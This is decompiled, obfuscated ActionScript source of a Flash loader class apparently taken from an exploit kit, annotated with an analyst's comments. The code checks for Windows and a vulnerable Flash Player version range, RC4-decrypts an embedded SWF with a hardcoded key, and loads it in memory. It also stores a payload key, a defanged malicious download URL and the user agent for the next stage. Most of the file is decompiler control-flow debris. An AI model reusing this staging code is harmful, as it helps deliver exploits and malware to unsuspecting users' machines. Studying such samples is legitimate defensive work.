package blobs
{
   import flash.display.Sprite;
   import flash.events.Event;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   import flash.net.SharedObject;
   import flash.display.Loader;
   import flash.system.Capabilities;
   
   public final class nw22 extends Sprite
   {
       
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myClass06:Class;
      
      private var m_myStr08:String;
      
      public function nw22(param1:Object, param2:Object)
      {
         if(!_loc4_)
         {
            m_myClass06 = §nw22_swf_rc4$341acf8a38c7ef2cbe35c674750c202b-394312611§;
            if(!_loc3_)
            {
               if(_loc3_)
               {
                  addr34:
                  while(true)
                  {
                     this.config_json = param1;
                     if(!_loc4_)
                     {
                        if(!_loc4_)
                        {
                        }
                        addr78:
                        this.targets_info = param2;
                        addr124:
                        if(_loc3_)
                        {
                        }
                        this.init();
                        if(!_loc3_)
                        {
                           break;
                        }
                        break;
                     }
                     break;
                  }
                  return;
               }
               while(true)
               {
                  super();
                  if(!_loc4_)
                  {
                     if(!_loc4_)
                     {
                        §§goto(addr34);
                     }
                     §§goto(addr78);
                  }
                  break;
               }
            }
            addr111:
            if(!_loc4_)
            {
            }
            return;
         }
         if(!_loc3_)
         {
         }
         if(false === this.isSuitable())
         {
            if(!_loc4_)
            {
               §§goto(addr111);
            }
            else
            {
               addr119:
               if(stage)
               {
                  if(!_loc4_)
                  {
                     §§goto(addr124);
                  }
               }
               else
               {
                  addEventListener("addedToStage",this.init);
               }
            }
         }
         else
         {
            this.m_myStr08 = "edfdamtlkfg511485";
            if(!_loc4_)
            {
               §§goto(addr119);
            }
         }
         §§goto(addr134);
      }
      
      private final function init(param1:Event = null) : void
      {
         if(!_loc5_)
         {
            removeEventListener("addedToStage",this.init);
         }
		 //§nw22_swf_rc4$341acf8a38c7ef2cbe35c674750c202b-394312611§;
         var _loc2_:ByteArray = new m_myClass06() as ByteArray;
         _loc2_ = Crypt.rc4(_loc2_, this.m_myStr08);
		 // http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/SharedObject.html
		 // Create a shared object
         var _loc3_:SharedObject = SharedObject.getLocal("nw22");
         if(!_loc6_)
         {
            _loc3_.clear();
            if(!_loc5_)
            {
               _loc3_.data["nw22"] = {
				   // 'key': {'payload': 'njikqzcmxs'},
                  "key":this.config_json.key.payload,
				  // 'link': { 'pnw22': 'hxxp://zodlp[.]aebeike[.]xyz/breast/ZW92eHZ6cGg',
                  "url":this.config_json.link.pnw22,
				  // 
                  "uas":this.targets_info.userAgent
               };
               if(_loc6_)
               {
               }
            }
            _loc3_.flush();
         }
         var _loc4_:Loader = new Loader();
         _loc4_.loadBytes(_loc2_);
         if(!_loc5_)
         {
            this.stage.addChild(_loc4_);
         }
      }
      
      public final function isSuitable() : Boolean
      {
         var _loc1_:* = Capabilities.version.toLowerCase().split(" ");
         if(!_loc4_)
         {
            §§push(_loc1_);
            §§push(0);
            if(_loc3_)
            {
               §§push((§§pop() + 110 + 97) * 20);
            }
            if(§§pop()[§§pop()] == "win")
            {
               §§push(this.getFlVerUint());
               if(!_loc4_)
               {
                  §§push(uint(§§pop()));
               }
               var _loc2_:* = §§pop();
               if(!_loc4_)
               {
                  §§push(_loc2_);
                  if(!_loc4_)
                  {
                     §§push(116600000);
                     if(_loc4_)
                     {
                        §§push(-((§§pop() - 1) * 90 + 1 + 55));
                     }
                     if(!_loc4_)
                     {
                        §§push(§§pop() > §§pop());
                        if(!_loc4_)
                        {
                           if(§§pop())
                           {
                              if(!_loc3_)
                              {
                                 §§pop();
                              }
                           }
                        }
                        addr105:
                        return §§pop();
                     }
                     addr104:
                     §§goto(addr105);
                     §§push(§§pop() <= §§pop());
                  }
                  addr94:
                  §§push(200000235);
                  if(_loc4_)
                  {
                     §§push(-(-(§§pop() - 1) - 110) + 1 + 1);
                  }
                  §§goto(addr104);
               }
               §§goto(addr94);
               §§push(_loc2_);
            }
         }
         return false;
      }
      
      private final function getFlVerUint() : uint
      {
         §§push(0);
         if(_loc6_)
         {
            §§push(§§pop() + 1 + 64 + 1);
         }
         §§push(0);
         if(_loc6_)
         {
            §§push((-(§§pop() - 11) - 14) * 114 + 13);
         }
         if(!_loc6_)
         {
            §§push(_loc1_);
            if(!_loc5_)
            {
               §§push(§§pop().length);
               §§push(4);
               if(_loc6_)
               {
                  §§push((-(§§pop() * 76) + 117) * 34 - 1 + 1);
               }
               if(§§pop() < §§pop())
               {
                  if(!_loc5_)
                  {
                     §§push(0);
                     if(_loc6_)
                     {
                        return -(§§pop() - 56) + 1 - 1;
                     }
                  }
               }
               else
               {
                  §§push(_loc1_);
                  if(_loc6_)
                  {
                  }
               }
               addr95:
               §§push(_loc4_);
               if(!_loc5_)
               {
                  §§push(§§pop().length);
                  §§push(4);
                  if(_loc6_)
                  {
                     §§push(§§pop() - 88 - 16 + 1 + 1);
                  }
                  addr113:
                  if(§§pop() != §§pop())
                  {
                     if(!_loc6_)
                     {
                        §§push(0);
                        if(_loc6_)
                        {
                           return (-§§pop() - 86 + 28 - 66 - 1) * 9;
                        }
                     }
                     while(true)
                     {
                        if(_loc5_)
                        {
                           loop39:
                           while(true)
                           {
                              addr323:
                              while(true)
                              {
                                 §§push(1);
                                 if(_loc5_)
                                 {
                                    §§push(-(§§pop() * 100 * 53) + 94);
                                 }
                                 addr333:
                                 while(true)
                                 {
                                    if(!_loc6_)
                                    {
                                       §§push(uint(§§pop()[§§pop()]));
                                       if(!_loc5_)
                                       {
                                          if(!_loc5_)
                                          {
                                             if(_loc6_)
                                             {
                                                loop10:
                                                while(true)
                                                {
                                                   addr357:
                                                   while(true)
                                                   {
                                                      if(!_loc6_)
                                                      {
                                                         addr361:
                                                         while(true)
                                                         {
                                                            if(!_loc5_)
                                                            {
                                                               addr365:
                                                               while(true)
                                                               {
                                                                  addr366:
                                                                  while(true)
                                                                  {
                                                                  }
                                                               }
                                                               §§push(§§pop() + §§pop());
                                                            }
                                                            addr437:
                                                            while(true)
                                                            {
                                                               addr438:
                                                               while(true)
                                                               {
                                                                  addr439:
                                                                  loop5:
                                                                  while(true)
                                                                  {
                                                                     addr440:
                                                                     while(true)
                                                                     {
                                                                        if(_loc6_)
                                                                        {
                                                                           addr451:
                                                                           while(true)
                                                                           {
                                                                              §§push(_loc2_);
                                                                              if(!_loc6_)
                                                                              {
                                                                                 §§push(1000);
                                                                                 if(_loc5_)
                                                                                 {
                                                                                    §§push(--(§§pop() - 1) * 74 + 1 - 64);
                                                                                 }
                                                                                 addr466:
                                                                                 while(true)
                                                                                 {
                                                                                    addr467:
                                                                                    while(true)
                                                                                    {
                                                                                       if(!_loc6_)
                                                                                       {
                                                                                          §§push(uint(§§pop()));
                                                                                       }
                                                                                       addr507:
                                                                                       while(true)
                                                                                       {
                                                                                          §§push(uint(§§pop()));
                                                                                          if(!_loc5_)
                                                                                          {
                                                                                             addr512:
                                                                                             while(true)
                                                                                             {
                                                                                                if(_loc6_)
                                                                                                {
                                                                                                   break;
                                                                                                }
                                                                                                continue loop10;
                                                                                             }
                                                                                             §§push(_loc2_);
                                                                                             break loop5;
                                                                                          }
                                                                                          break loop5;
                                                                                       }
                                                                                    }
                                                                                 }
                                                                              }
                                                                              break loop5;
                                                                           }
                                                                        }
                                                                        else
                                                                        {
                                                                           continue loop39;
                                                                        }
                                                                     }
                                                                  }
                                                                  return uint(§§pop());
                                                               }
                                                            }
                                                         }
                                                         §§push(_loc3_);
                                                      }
                                                      addr436:
                                                      while(true)
                                                      {
                                                         §§goto(addr437);
                                                      }
                                                   }
                                                }
                                             }
                                             addr485:
                                             while(true)
                                             {
                                                addr486:
                                                while(true)
                                                {
                                                   §§push(10);
                                                   if(_loc6_)
                                                   {
                                                      §§push(-(§§pop() - 30) * 49 - 50);
                                                   }
                                                   addr506:
                                                   while(true)
                                                   {
                                                      §§goto(addr507);
                                                   }
                                                }
                                             }
                                          }
                                       }
                                       loop16:
                                       while(true)
                                       {
                                          addr472:
                                          loop23:
                                          while(true)
                                          {
                                             if(!_loc6_)
                                             {
                                                if(_loc6_)
                                                {
                                                   §§goto(addr485);
                                                }
                                                addr406:
                                                while(true)
                                                {
                                                   §§push(_loc2_);
                                                   if(!_loc6_)
                                                   {
                                                      addr411:
                                                      while(true)
                                                      {
                                                         addr412:
                                                         while(true)
                                                         {
                                                            §§push(§§pop() + §§pop());
                                                            if(!_loc6_)
                                                            {
                                                               addr415:
                                                               while(true)
                                                               {
                                                                  §§push(uint(§§pop()));
                                                                  if(_loc5_)
                                                                  {
                                                                  }
                                                                  §§goto(addr524);
                                                               }
                                                            }
                                                            §§goto(addr467);
                                                         }
                                                      }
                                                   }
                                                   while(true)
                                                   {
                                                      if(!_loc5_)
                                                      {
                                                         addr421:
                                                         while(true)
                                                         {
                                                            if(!_loc5_)
                                                            {
                                                               addr424:
                                                               while(true)
                                                               {
                                                                  if(_loc5_)
                                                                  {
                                                                     addr435:
                                                                     while(true)
                                                                     {
                                                                        §§goto(addr436);
                                                                     }
                                                                  }
                                                                  §§goto(addr523);
                                                               }
                                                            }
                                                            else
                                                            {
                                                               continue loop23;
                                                            }
                                                         }
                                                      }
                                                      else
                                                      {
                                                         continue loop16;
                                                      }
                                                   }
                                                }
                                             }
                                             §§goto(addr512);
                                          }
                                       }
                                    }
                                    addr392:
                                    while(true)
                                    {
                                       addr394:
                                       while(true)
                                       {
                                          addr395:
                                          while(true)
                                          {
                                             if(_loc6_)
                                             {
                                                §§goto(addr406);
                                             }
                                             §§goto(addr435);
                                          }
                                       }
                                    }
                                 }
                              }
                           }
                        }
                        else
                        {
                           §§push(_loc2_);
                           if(!_loc6_)
                           {
                              if(!_loc5_)
                              {
                                 §§push(1000);
                                 if(_loc5_)
                                 {
                                    §§push(-((§§pop() - 1 - 113 - 1 - 75) * 37));
                                 }
                                 if(!_loc5_)
                                 {
                                    if(!_loc5_)
                                    {
                                       §§push(§§pop() * §§pop());
                                       if(!_loc5_)
                                       {
                                          if(!_loc5_)
                                          {
                                             if(!_loc5_)
                                             {
                                                §§push(uint(§§pop()));
                                                if(!_loc5_)
                                                {
                                                   if(!_loc5_)
                                                   {
                                                      if(!_loc5_)
                                                      {
                                                         if(_loc6_)
                                                         {
                                                            addr194:
                                                            while(true)
                                                            {
                                                               §§push(_loc4_);
                                                               if(!_loc5_)
                                                               {
                                                                  if(_loc5_)
                                                                  {
                                                                  }
                                                                  addr382:
                                                                  while(true)
                                                                  {
                                                                     §§push(0);
                                                                     if(_loc6_)
                                                                     {
                                                                        §§push(-(§§pop() - 91) + 1 - 42 - 1);
                                                                     }
                                                                     §§goto(addr392);
                                                                  }
                                                               }
                                                               break;
                                                            }
                                                            loop4:
                                                            while(true)
                                                            {
                                                               if(!_loc5_)
                                                               {
                                                                  §§push(2);
                                                                  if(_loc5_)
                                                                  {
                                                                     §§push((§§pop() * 84 - 1) * 114 - 54 + 1 - 18 - 4);
                                                                  }
                                                                  addr298:
                                                                  while(true)
                                                                  {
                                                                     §§push(uint(§§pop()[§§pop()]));
                                                                     if(!_loc5_)
                                                                     {
                                                                        if(!_loc5_)
                                                                        {
                                                                           if(!_loc6_)
                                                                           {
                                                                              if(!_loc5_)
                                                                              {
                                                                                 break loop4;
                                                                              }
                                                                           }
                                                                           §§goto(addr439);
                                                                        }
                                                                        §§goto(addr357);
                                                                     }
                                                                     §§goto(addr524);
                                                                  }
                                                               }
                                                               §§goto(addr323);
                                                            }
                                                            continue;
                                                         }
                                                         addr236:
                                                         while(true)
                                                         {
                                                            §§push(_loc2_);
                                                            if(!_loc6_)
                                                            {
                                                               §§push(_loc3_);
                                                               if(!_loc6_)
                                                               {
                                                                  if(!_loc5_)
                                                                  {
                                                                     §§push(§§pop() + §§pop());
                                                                     if(!_loc5_)
                                                                     {
                                                                        §§push(uint(§§pop()));
                                                                        if(!_loc5_)
                                                                        {
                                                                           if(!_loc6_)
                                                                           {
                                                                              if(!_loc5_)
                                                                              {
                                                                                 if(_loc5_)
                                                                                 {
                                                                                    addr279:
                                                                                    while(true)
                                                                                    {
                                                                                       §§goto(addr281);
                                                                                    }
                                                                                 }
                                                                                 else
                                                                                 {
                                                                                    §§goto(addr194);
                                                                                 }
                                                                                 §§goto(addr382);
                                                                              }
                                                                              §§goto(addr424);
                                                                           }
                                                                           §§goto(addr486);
                                                                        }
                                                                        §§goto(addr411);
                                                                     }
                                                                     §§goto(addr467);
                                                                  }
                                                                  §§goto(addr361);
                                                               }
                                                               §§goto(addr412);
                                                            }
                                                            break;
                                                         }
                                                      }
                                                      §§goto(addr472);
                                                   }
                                                   §§goto(addr366);
                                                }
                                                §§goto(addr421);
                                             }
                                             §§goto(addr438);
                                          }
                                          §§goto(addr365);
                                       }
                                       §§goto(addr415);
                                    }
                                    §§goto(addr506);
                                 }
                                 §§goto(addr466);
                              }
                              §§goto(addr394);
                           }
                           addr218:
                           while(true)
                           {
                              if(!_loc6_)
                              {
                                 if(!_loc5_)
                                 {
                                    if(!_loc6_)
                                    {
                                       if(_loc5_)
                                       {
                                          §§goto(addr236);
                                       }
                                       §§goto(addr451);
                                    }
                                    §§goto(addr440);
                                 }
                              }
                              break;
                           }
                           §§goto(addr424);
                        }
                        while(true)
                        {
                           if(!_loc6_)
                           {
                              if(!_loc5_)
                              {
                                 break;
                              }
                           }
                           §§goto(addr395);
                        }
                        §§goto(addr279);
                     }
                  }
                  while(true)
                  {
                     §§goto(addr382);
                     §§goto(addr113);
                  }
               }
               while(true)
               {
                  §§push(3);
                  if(_loc5_)
                  {
                     §§push(--§§pop() * 39);
                  }
                  if(!_loc6_)
                  {
                     if(!_loc5_)
                     {
                        §§push(uint(§§pop()[§§pop()]));
                        if(!_loc5_)
                        {
                           §§goto(addr218);
                        }
                        §§goto(addr421);
                     }
                     §§goto(addr333);
                  }
                  §§goto(addr298);
               }
            }
            §§push(4);
            if(_loc6_)
            {
               §§push(§§pop() * 51 - 45 - 1 + 1);
            }
            §§push(§§pop().substr(§§pop()));
            if(_loc6_)
            {
            }
            §§goto(addr95);
         }
         §§goto(addr95);
      }
   }
}
